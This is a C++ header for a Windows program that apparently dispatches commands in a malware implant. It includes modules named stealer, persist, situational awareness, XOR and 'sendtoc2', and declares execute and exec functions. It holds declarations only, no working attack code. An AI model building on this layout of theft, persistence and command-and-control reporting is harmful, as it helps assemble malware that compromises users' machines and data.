#ifndef EXECUTE_H
#define EXECUTE_H

/* Standard Header Files */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <sstream>


/* Libraries */
#include "../nlohmann/json.hpp"

using json = nlohmann::json;

/* Header files of Implementations */
#include "../http/http.h"
#include "../stealer/stealer.h"
#include "../persist/persist.h"
#include "../situational_awareness/GatherInfo.h"
#include "../file/file.h"
#include "../xor/xor.h"
#include "../sendtoc2/Post.h"

/* Variables */
#define BUF_SIZE 4096

/* Functions */
void execute(std::string, std::string, int, int);
std::string exec(char*);

#endif